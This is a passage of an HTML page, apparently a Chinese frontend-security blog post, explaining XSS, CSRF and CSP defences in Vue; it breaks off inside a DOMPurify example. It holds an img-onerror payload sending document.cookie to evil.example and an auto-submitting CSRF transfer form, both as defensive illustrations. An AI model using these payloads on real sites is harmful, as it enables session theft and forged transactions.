@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="light">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>别再用 `v-html` 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质 | 小曾博客</title>
+  <meta name="description" content="v-html 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质\">别再用 v-html 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质 引言 先看一段真实的生产事故复盘： 某电商团队在 Vue 3 的商品详情页里做了一个\"富文本规格说明\"功能，后端返回一段带样式的 HTML，前端直接 。上线三个月风平浪静，直到某天运营同学在后台导入了一批第三方供应商的规格数据——其中">
+  <meta name="keywords" content="frontend,vue,react,typescript,javascript,nodejs">
+  <meta name="author" content="小曾">
+  <meta name="copyright" content="小曾">
+  <meta name="format-detection" content="telephone=no">
+  <link rel="shortcut icon" href="/img/favicon.png">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <link rel="preconnect" href="//cdn.jsdelivr.net"/>
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/>
+  <link rel="dns-prefetch" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="//busuanzi.ibruce.info"/>
+  <link rel="dns-prefetch" href="//busuanzi.ibruce.info"/>
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="别再用 `v-html` 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质">
+  <meta name="twitter:description" content="v-html 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质\">别再用 v-html 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质 引言 先看一段真实的生产事故复盘： 某电商团队在 Vue 3 的商品详情页里做了一个\"富文本规格说明\"功能，后端返回一段带样式的 HTML，前端直接 。上线三个月风平浪静，直到某天运营同学在后台导入了一批第三方供应商的规格数据——其中">
+  <meta name="twitter:image" content="https://api.btstu.cn/sjbz/api.php?lx=fengjing&format=images&_=4295">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="别再用 `v-html` 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质">
+  <meta property="og:url" content="https://xiaozeng26.github.io/">
+  <meta property="og:site_name" content="小曾博客">
+  <meta property="og:description" content="v-html 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质\">别再用 v-html 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质 引言 先看一段真实的生产事故复盘： 某电商团队在 Vue 3 的商品详情页里做了一个\"富文本规格说明\"功能，后端返回一段带样式的 HTML，前端直接 。上线三个月风平浪静，直到某天运营同学在后台导入了一批第三方供应商的规格数据——其中">
+  <meta property="og:image" content="https://api.btstu.cn/sjbz/api.php?lx=fengjing&format=images&_=4295">
+  <meta property="article:published_time" content="2026-11-26T04:50:23.000Z">
+  <meta property="article:modified_time" content="2026-11-26T04:50:23.000Z">
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script>
+  <script>
+var autoChangeMode = '1'
+var t = Cookies.get("theme")
+if (autoChangeMode == '1'){
+  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
+  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
+  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+  if (t === undefined){
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport){
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour < 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+  }
+  } else if (t == 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode == '2'){
+  now = new Date();
+  hour = now.getHours();
+  isNight = hour < 6 || hour >= 18
+  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if ( t == 'dark' ) activateDarkMode()
+  else if ( t == 'light') activateLightMode()
+}
+function activateDarkMode(){
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
+  }
+}
+function activateLightMode(){
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
+  }
+}
+  </script>
+  <link rel="stylesheet" href="/css/index.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css">
+  <link rel="canonical" href="https://xiaozeng26.github.io/">
+  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/disqusjs@1.2/dist/disqusjs.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web">
+  <script>
+var GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xiaozeng26.github.io/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  copy: { success: '复制成功', error: '复制错误', noSupport: '浏览器不支持' },
+  bookmark: { message_prev: '按', message_next: '键将本页加入书签' },
+  runtime_unit: '天',
+  runtime: true,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  highlightShrink: 'false',
+  isFontAwesomeV5: false,
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isanchor: true
+}
+  </script>
+  <script>var GLOBAL_CONFIG_SITE = { isPost: true, isHome: false, isSidebar: true }</script>
+  <noscript><style>#page-header { opacity: 1 } .justified-gallery img{ opacity: 1 }</style></noscript>
+  <link rel="stylesheet" href="/css/background.css">
+  <meta name="generator" content="Hexo 4.2.0">
+  <link rel="alternate" href="/atom.xml" title="小曾博客" type="application/atom+xml">
+</head>
+<body>
+<div id="mobile-sidebar">
+  <div id="menu_mask"></div>
+  <div id="mobile-sidebar-menus">
+    <div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.jfif" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div>
+    <div class="mobile_post_data">
+      <div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div></a></div></div>
+      <div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div></a></div></div>
+      <div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div></a></div></div>
+    </div>
+    <hr/>
+    <div class="menus_items">
+      <div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div>
+      <div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div>
+      <div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div>
+      <div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div>
+      <div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div>
+      <div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-link"></i><span> 留言板</span></a></div>
+      <div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div>
+      <div class="menus_item">
+        <a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 娱乐</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a>
+        <ul class="menus_item_child">
+          <li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li>
+          <li><a class="site-page" href="/photos/"><i class="fa-fw fa fa-picture-o"></i><span> Photos</span></a></li>
+          <li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+<i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true"></i>
+<div id="sidebar">
+  <div class="sidebar-toc">
+    <div class="sidebar-toc__title">目录</div>
+    <div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div>
+    <div class="sidebar-toc__content"><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#别再用-v-html-了-从浏览器渲染管线拆解-XSS-CSRF-CSP-的攻防本质"><span class="toc-text">v-html 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质">别再用 v-html 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质</span></a></li>
+<li class="toc-item toc-level-2"><a class="toc-link" href="#引言"><span class="toc-text">引言</span></a></li>
+<li class="toc-item toc-level-2"><a class="toc-link" href="#一-核心概念-把浏览器想象成一家-自助餐厅"><span class="toc-text">一、核心概念：把浏览器想象成一家"自助餐厅"</span></a></li>
+<li class="toc-item toc-level-2"><a class="toc-link" href="#二-原理深挖-从渲染管线看-XSS-为什么防不住"><span class="toc-text">二、原理深挖：从渲染管线看 XSS 为什么防不住</span></a></li>
+<li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-浏览器如何把字符串变成-DOM"><span class="toc-text">2.1 浏览器如何把字符串变成 DOM</span></a></li>
+<li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-源码级-Vue-的-v-html-到底做了什么"><span class="toc-text">v-html 到底做了什么">2.2 源码级：Vue 的 v-html 到底做了什么</span></a></li>
+<li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-CSRF-的本质-凭证携带与请求来源的解耦"><span class="toc-text">2.3 CSRF 的本质：凭证携带与请求来源的解耦</span></a></li>
+<li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-CSP-的执行模型-为什么-unsafe-inline-等于没防"><span class="toc-text">'unsafe-inline' 等于没防">2.4 CSP 的执行模型：为什么 'unsafe-inline' 等于没防</span></a></li>
+<li class="toc-item toc-level-2"><a class="toc-link" href="#三-实战代码-三个可落地的完整示例"><span class="toc-text">三、实战代码：三个可落地的完整示例</span></a></li>
+<li class="toc-item toc-level-3"><a class="toc-link" href="#示例-1-服务端-sanitize-用-DOMPurify-建立-可信-HTML-边界"><span class="toc-text">示例 1：服务端 sanitize —— 用 DOMPurify 建立"可信 HTML"边界</span></a></li>
+<li class="toc-item toc-level-3"><a class="toc-link" href="#示例-2-前端-CSRF-防护-Double-Submit-Cookie-Origin-校验"><span class="toc-text">示例 2：前端 CSRF 防护 —— Double Submit Cookie + Origin 校验</span></a></li>
+<li class="toc-item toc-level-3"><a class="toc-link" href="#示例-3-CSP-违规上报-渐进式上线"><span class="toc-text">示例 3：CSP 违规上报 + 渐进式上线</span></a></li>
+<li class="toc-item toc-level-2"><a class="toc-link" href="#四-方案对比-三层防御的取舍"><span class="toc-text">四、方案对比：三层防御的取舍</span></a></li>
+<li class="toc-item toc-level-2"><a class="toc-link" href="#五-最佳实践与避坑指南"><span class="toc-text">五、最佳实践与避坑指南</span></a></li>
+<li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-侧"><span class="toc-text">XSS 侧</span></a></li>
+<li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-侧"><span class="toc-text">CSRF 侧</span></a></li>
+<li class="toc-item toc-level-3"><a class="toc-link" href="#CSP-侧"><span class="toc-text">CSP 侧</span></a></li>
+<li class="toc-item toc-level-3"><a class="toc-link" href="#一个容易被忽视的高级话题-Trusted-Types"><span class="toc-text">一个容易被忽视的高级话题：Trusted Types</span></a></li>
+<li class="toc-item toc-level-2"><a class="toc-link" href="#六-总结"><span class="toc-text">六、总结</span></a></li></ol></div></div>
+  </div>
+</div>
+<div id="body-wrap">
+  <div class="post-bg" id="nav" style="background-image: url(https://api.btstu.cn/sjbz/api.php?lx=fengjing&format=images&_=4295)">
+    <div id="page-header">
+      <span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">小曾博客</a></span>
+      <span class="pull_right menus">
+        <div class="menus_items">
+          <div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div>
+          <div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div>
+          <div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div>
+          <div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div>
+          <div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div>
+          <div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-link"></i><span> 留言板</span></a></div>
+          <div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div>
+          <div class="menus_item">
+            <a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 娱乐</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a>
+            <ul class="menus_item_child">
+              <li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li>
+              <li><a class="site-page" href="/photos/"><i class="fa-fw fa fa-picture-o"></i><span> Photos</span></a></li>
+              <li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li>
+            </ul>
+          </div>
+        </div>
+        <span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span>
+      </span>
+    </div>
+    <div id="post-info">
+      <div id="post-title"><div class="posttitle">别再用 `v-html` 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质</div></div>
+      <div id="post-meta">
+        <div class="meta-firstline">
+          <time class="post-meta__date">
+            <span class="post-meta__date-created" title="发表于 2026-11-26"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2026-11-26</span>
+            <span class="post-meta__separator">|</span>
+            <span class="post-meta__date-updated" title="更新于 2026-11-26"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2026-11-26</span>
+          </time>
+        </div>
+        <div class="meta-secondline">
+          <span class="post-meta-categories">
+            <span class="post-meta__separator">|</span>
+            <i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i>
+            <a class="post-meta__categories" href="/categories/">frontend</a>
+          </span>
+        </div>
+        <div class="meta-thirdline">
+          <span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span>
+          <span class="post-meta-commentcount"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+  <main class="layout_post" id="content-inner">
+    <article id="post">
+      <div class="post-content" id="article-container">
+        <h1 id="别再用-v-html-了-从浏览器渲染管线拆解-XSS-CSRF-CSP-的攻防本质"><a href="#别再用-v-html-了-从浏览器渲染管线拆解-XSS-CSRF-CSP-的攻防本质" class="headerlink" title="别再用 <code>v-html</code> 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质"></a>别再用 <code>v-html</code> 了：从浏览器渲染管线拆解 XSS/CSRF/CSP 的攻防本质</h1>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2>
+<p>先看一段真实的生产事故复盘：</p>
+<p>某电商团队在 Vue 3 的商品详情页里做了一个"富文本规格说明"功能，后端返回一段带样式的 HTML，前端直接 <code><div v-html="specHtml"></div></code>。上线三个月风平浪静，直到某天运营同学在后台导入了一批第三方供应商的规格数据——其中一条的 <code>specHtml</code> 长这样：</p>
+<figure class="highlight html"><pre><code class="language-html">&lt;img src=x onerror=&quot;fetch(&#x27;https://evil.example/steal?c=&#x27;+document.cookie)&quot;&gt;</code></pre></figure>
+<p>结果：<code>httpOnly</code> 没设的登录态 Cookie 被打包带走，攻击者拿着它批量下单、修改收货地址。更糟的是，这段 payload 被存进了数据库，每个访问该商品页的用户都会中招——这就是<strong>存储型 XSS</strong> 的典型杀伤链。</p>
+<p>很多工程师对 XSS 的认知停在"转义一下尖括号就行了"，对 CSRF 的认知停在"加个 token"，对 CSP 的认知停在"在 nginx 里加个 header"。但这三个东西恰恰是<strong>浏览器安全模型的三根支柱</strong>，它们各自防守的边界完全不同，混为一谈就会写出"看起来很安全"的漏洞代码。</p>
+<p>这篇文章我不打算再复述一遍 OWASP 的 checklist。我想从<strong>浏览器渲染管线和同源策略的底层机制</strong>出发，讲清楚：</p>
+<ul>
+<li>为什么 <code>v-html</code> 的危险不是"渲染了 HTML"，而是"让不可信字符串进入了 DOM 的解析上下文"；</li>
+</ul>
+<ul>
+<li>CSRF 的本质不是"没有 token"，而是"浏览器会自动携带凭证，而凭证的携带与请求的发起方无关"；</li>
+</ul>
+<ul>
+<li>CSP 为什么能兜底 XSS，以及为什么 <code>'unsafe-inline'</code> 会让它形同虚设。</li>
+</ul>
+<hr>
+<h2 id="一-核心概念-把浏览器想象成一家-自助餐厅"><a href="#一-核心概念-把浏览器想象成一家-自助餐厅" class="headerlink" title="一、核心概念：把浏览器想象成一家"自助餐厅""></a>一、核心概念：把浏览器想象成一家"自助餐厅"</h2>
+<p>我用一个贯穿全文的类比来建立直觉。</p>
+<p><strong>浏览器 = 一家自助餐厅</strong>，页面里的 HTML/JS/CSS 就是顾客能接触到的所有东西。</p>
+<ul>
+<li><strong>XSS（跨站脚本）</strong>：攻击者把一张写着"把收银台的钱交给我"的假菜单，混进了餐厅的官方菜单里。顾客以为是餐厅提供的，照做了。核心问题是<strong>"数据和代码混在一起，餐厅分不清哪张是官方菜单"</strong>。</li>
+</ul>
+<ul>
+<li><strong>CSRF（跨站请求伪造）</strong>：攻击者在餐厅门口贴了张"凭你的会员卡可免费领饮料"的告示，你拿着自己的会员卡（浏览器自动携带的 Cookie）去柜台，柜台看到有效会员卡就发饮料——但其实这是攻击者想让你触发的操作。核心问题是<strong>"凭证跟着人走，但不验证是谁让你来的"</strong>。</li>
+</ul>
+<ul>
+<li><strong>CSP（内容安全策略）</strong>：餐厅老板给后厨定了一份"白名单采购清单"：只能从这几家供应商进货，别的一律不收。就算有人塞了假菜单，后厨也不会执行。核心是<strong>"用声明式策略约束资源的加载与执行"</strong>。</li>
+</ul>
+<p>技术定义上：</p>
+<table>
+<thead>
+<tr>
+<th>攻击</th>
+<th>利用的信任边界</th>
+<th>根本缺陷</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>XSS</td>
+<td>页面内 JS 执行上下文</td>
+<td>不可信数据进入了可执行/可解析上下文</td>
+</tr><tr>
+<td>CSRF</td>
+<td>浏览器对目标站点的自动凭证携带</td>
+<td>请求来源（Origin）未参与授权判断</td>
+</tr><tr>
+<td>CSP</td>
+<td>资源的加载来源</td>
+<td>缺少对"允许谁执行什么"的声明式约束</td>
+</tr></tbody></table>
+<p>三者不是并列关系，而是<strong>纵深防御的三个层次</strong>：XSS 是"输入信任"的问题，CSRF 是"请求来源"的问题，CSP 是"运行时兜底"的问题。</p>
+<hr>
+<h2 id="二-原理深挖-从渲染管线看-XSS-为什么防不住"><a href="#二-原理深挖-从渲染管线看-XSS-为什么防不住" class="headerlink" title="二、原理深挖：从渲染管线看 XSS 为什么防不住"></a>二、原理深挖：从渲染管线看 XSS 为什么防不住</h2>
+<h3 id="2-1-浏览器如何把字符串变成-DOM"><a href="#2-1-浏览器如何把字符串变成-DOM" class="headerlink" title="2.1 浏览器如何把字符串变成 DOM"></a>2.1 浏览器如何把字符串变成 DOM</h3>
+<p>要理解 XSS，得先理解浏览器把一段字符串变成可执行页面的过程。简化版渲染管线：</p>
+<div class="mermaid">
+graph TD
+    A[HTML 字节流] --> B[Tokenization 词法分析]
+    B --> C[Tree Construction 建 DOM 树]
+    C --> D[遇到 script 标签: 交给 JS 引擎]
+    D --> E[CSSOM 构建]
+    C --> F[Render Tree]
+    E --> F
+    F --> G[Layout 布局]
+    G --> H[Paint 绘制]
+    H --> I[Composite 合成]
+    D --> J[执行上下文: 可访问 document/cookie/fetch]
+    J --> F
+</div>
+<p>关键点在于：<strong>HTML 解析器在 Tree Construction 阶段遇到 <code><script></code> 会暂停解析，把内容交给 JS 引擎执行</strong>。而 <code>onerror</code>、<code>onclick</code> 这类内联事件处理器，是 DOM 属性，在事件触发时被当作 JS 执行。</p>
+<p>所以"XSS 的本质"可以精确定义为：<strong>不可信字符串在 HTML 解析上下文中被重新赋予了"代码"的语义</strong>。注意这里有两个不同层次：</p>
+<ol>
+<li><strong>HTML 注入</strong>：字符串被解析成 DOM 节点（例如多出一个 <code><img></code>）；</li>
+<li><strong>JS 执行</strong>：注入的节点通过内联事件、<code><script></code>、<code>javascript:</code> URL 等途径触发了脚本执行。</li>
+</ol>
+<p><code>v-html</code> 的危险就在第 1 层——它主动把字符串交给了 <code>innerHTML</code> 的解析上下文。而第 2 层是否发生，取决于注入内容能否触发脚本。</p>
+<h3 id="2-2-源码级-Vue-的-v-html-到底做了什么"><a href="#2-2-源码级-Vue-的-v-html-到底做了什么" class="headerlink" title="2.2 源码级：Vue 的 <code>v-html</code> 到底做了什么"></a>2.2 源码级：Vue 的 <code>v-html</code> 到底做了什么</h3>
+<p>Vue 3 的 <code>v-html</code> 编译后会生成 <code>innerHTML</code> 赋值。看编译产物（简化）：</p>
+<figure class="highlight js"><pre><code class="language-js">// 模板: &lt;div v-html=&quot;specHtml&quot;&gt;&lt;/div&gt;
+// 编译产物（简化）
+import { createElementVNode as _createElementVNode } from &quot;vue&quot;
+
+export function render(_ctx) {
+  return _createElementVNode(&quot;div&quot;, { innerHTML: _ctx.specHtml }, null, 8 /* PROPS */, [&quot;innerHTML&quot;])
+}</code></pre></figure>
+<p>运行时 <code>patchProp</code> 对 <code>innerHTML</code> 的处理就是直接赋值：</p>
+<figure class="highlight ts"><pre><code class="language-ts">// packages/runtime-dom/src/modules/props.ts（简化摘录）
+export function patchDOMProp(el: any, key: string, value: any) {
+  if (key === &#x27;innerHTML&#x27; || key === &#x27;textContent&#x27;) {
+    // 直接交给浏览器的 HTML 解析器
+    el[key] = value == null ? &#x27;&#x27; : value
+    return
+  }
+  // ...
+}</code></pre></figure>
+<p><strong>注意：Vue 在这里没有任何 sanitize 动作</strong>。官方文档也明确写着 "v-html 的内容按普通 HTML 插入——数据绑定会被忽略……永远不要对用户提供的内容使用 v-html"。这不是 Vue 的懒惰，而是<strong>框架无法判断你的字符串是否可信</strong>——sanitize 策略必须由业务决定（哪些标签、属性、URL scheme 允许）。</p>
+<blockquote>
+<p>类比：<code>v-html</code> 相当于后厨的"代客加工"窗口——顾客把生食材递进来，后厨照着做。后厨不负责检查食材有没有毒，这是你的责任。</p>
+</blockquote>
+<p>React 的 <code>dangerouslySetInnerHTML</code> 同理，名字里那个 "dangerously" 就是作者在喊"这是你自己选的"。</p>
+<h3 id="2-3-CSRF-的本质-凭证携带与请求来源的解耦"><a href="#2-3-CSRF-的本质-凭证携带与请求来源的解耦" class="headerlink" title="2.3 CSRF 的本质：凭证携带与请求来源的解耦"></a>2.3 CSRF 的本质：凭证携带与请求来源的解耦</h3>
+<p>CSRF 的机制常被误解。看一个攻击页面：</p>
+<figure class="highlight html"><pre><code class="language-html">&lt;!-- 攻击者站点 evil.example 上的页面 --&gt;
+&lt;form action=&quot;https://bank.example/transfer&quot; method=&quot;POST&quot; id=&quot;f&quot;&gt;
+  &lt;input name=&quot;to&quot; value=&quot;attacker_account&quot;&gt;
+  &lt;input name=&quot;amount&quot; value=&quot;10000&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById(&#x27;f&#x27;).submit()&lt;/script&gt;</code></pre></figure>
+<p>当受害者访问 <code>evil.example</code> 时，这个表单会自动提交到 <code>bank.example</code>。<strong>浏览器会自动携带 <code>bank.example</code> 的 Cookie</strong>（这是 HTTP 无状态 + Cookie 域机制的必然结果），而 <code>bank.example</code> 的服务端只看到"一个带有效会话的 POST 请求"，无法区分是用户主动点击还是被诱导。</p>
+<p>这里有个关键认知：<strong>CSRF 攻击者不需要读取响应</strong>（受同源策略保护），他只需要"让请求发生"。所以防御的核心不是"防止请求发出"，而是"让服务端能验证请求的<strong>发起意图</strong>"。</p>
+<p><code>SameSite</code> Cookie 属性是浏览器层面的第一道防线：</p>
+<ul>
+<li><code>SameSite=Strict</code>：跨站请求完全不携带 Cookie；</li>
+</ul>
+<ul>
+<li><code>SameSite=Lax</code>（现代浏览器默认）：顶层 GET 导航携带，跨站 POST 不携带；</li>
+</ul>
+<ul>
+<li><code>SameSite=None</code>：必须配合 <code>Secure</code>，用于跨站场景（如嵌入第三方支付回调）。</li>
+</ul>
+<p>但 <code>SameSite</code> 不能覆盖所有场景（老浏览器、需要跨站的合法 POST），所以还需要 <strong>CSRF Token / Double Submit / Origin 校验</strong> 的组合拳。</p>
+<h3 id="2-4-CSP-的执行模型-为什么-unsafe-inline-等于没防"><a href="#2-4-CSP-的执行模型-为什么-unsafe-inline-等于没防" class="headerlink" title="2.4 CSP 的执行模型：为什么 <code>'unsafe-inline'</code> 等于没防"></a>2.4 CSP 的执行模型：为什么 <code>'unsafe-inline'</code> 等于没防</h3>
+<p>CSP 是浏览器在<strong>执行前</strong>的声明式拦截。它的核心指令：</p>
+<ul>
+<li><code>script-src</code>：允许加载/执行脚本的来源；</li>
+</ul>
+<ul>
+<li><code>style-src</code>：样式来源；</li>
+</ul>
+<ul>
+<li><code>default-src</code>：兜底；</li>
+</ul>
+<ul>
+<li><code>report-uri</code> / <code>report-to</code>：违规上报。</li>
+</ul>
+<p>关键机制：<strong>内联脚本（<code><script>...</script></code>、<code>onerror=</code>、<code>javascript:</code> URL）默认被 CSP 拦截</strong>，除非显式声明 <code>'unsafe-inline'</code> 或使用 nonce/hash。</p>
+<p>看一个严格但可用的策略：</p>
+<figure class="highlight "><pre><code>Content-Security-Policy:
+  default-src &#x27;self&#x27;;
+  script-src &#x27;self&#x27; &#x27;nonce-{random}&#x27; &#x27;strict-dynamic&#x27;;
+  object-src &#x27;none&#x27;;
+  base-uri &#x27;self&#x27;;
+  frame-ancestors &#x27;none&#x27;;</code></pre></figure>
+<ul>
+<li><code>'nonce-{random}'</code>：服务端每次渲染为 <code><script nonce="..."></code> 生成随机值，只有带正确 nonce 的脚本能执行——攻击者注入的 <code><script></code> 没有 nonce，直接被拦；</li>
+</ul>
+<ul>
+<li><code>'strict-dynamic'</code>：信任 nonce 脚本动态加载的子资源（现代 SPA 必需）；</li>
+</ul>
+<ul>
+<li><code>object-src 'none'</code>：禁用 Flash/插件类对象；</li>
+</ul>
+<ul>
+<li><code>base-uri 'self'</code>：防止 <code><base></code> 标签劫持相对路径；</li>
+</ul>
+<ul>
+<li><code>frame-ancestors 'none'</code>：等价于 <code>X-Frame-Options: DENY</code>，防点击劫持。</li>
+</ul>
+<p><strong>为什么 <code>'unsafe-inline'</code> 是毒药</strong>：它允许所有内联脚本执行，而 XSS 的主要 payload 形态（<code>onerror</code>、<code>onclick</code>、<code><script></code>）都是内联的。一旦开启，CSP 对 XSS 基本失去兜底意义。这也是为什么很多"加了 CSP 还是被打"的团队，检查后发现策略里赫然写着 <code>script-src 'self' 'unsafe-inline'</code>。</p>
+<hr>
+<h2 id="三-实战代码-三个可落地的完整示例"><a href="#三-实战代码-三个可落地的完整示例" class="headerlink" title="三、实战代码：三个可落地的完整示例"></a>三、实战代码：三个可落地的完整示例</h2>
+<h3 id="示例-1-服务端-sanitize-用-DOMPurify-建立-可信-HTML-边界"><a href="#示例-1-服务端-sanitize-用-DOMPurify-建立-可信-HTML-边界" class="headerlink" title="示例 1：服务端 sanitize —— 用 DOMPurify 建立"可信 HTML"边界"></a>示例 1：服务端 sanitize —— 用 DOMPurify 建立"可信 HTML"边界</h3>
+<p>思路：<strong>不可信 HTML 只在服务端/专用 worker 中经过 sanitize，产出"白名单化"的 HTML，前端才允许 <code>v-html</code></strong>。同时用 CSP nonce 兜底。</p>
+<figure class="highlight ts"><pre><code class="language-ts">// server/sanitize.ts  —— 运行在 Node.js 服务端
+// 依赖: npm i jsdom dompurify
+import { JSDOM } from &#x27;jsdom&#x27;
+import createDOMPurify from &#x27;dompurify&#x27;
+
+// 用 jsdom 构造一个隔离的 window 环境给 DOMPurify 用
+const window = new JSDOM(&#x27;&#x27;).window
+const DOMPurify = createDOMPurify(window)
+
+// 严格白名单：只放行富文本排版需要的标签与属性
+const PURIFY_CONFIG = {
+  ALLOWED_TAGS: [
+    &#x27;p&#x27;, &#x27;br&#x27;, &#x27;strong&#x27;, &#x27;em&#x27;, &#x27;u&#x27;, &#x27;s&#x27;, &#x27;span&#x27;,
+    &#x27;ul&#x27;, &#x27;ol&#x27;, &#x27;li&#x27;, &#x27;h1&#x27;, &#x27;h2&#x27;, &#x27;h3&#x27;, &#x27;h4&#x27;,
+    &#x27;table&#x27;, &#x27;thead&#x27;, &#x27;tbody&#x27;, &#x27;tr&#x27;, &#x27;th&#x27;, &#x27;td&#x27;,
+  ],
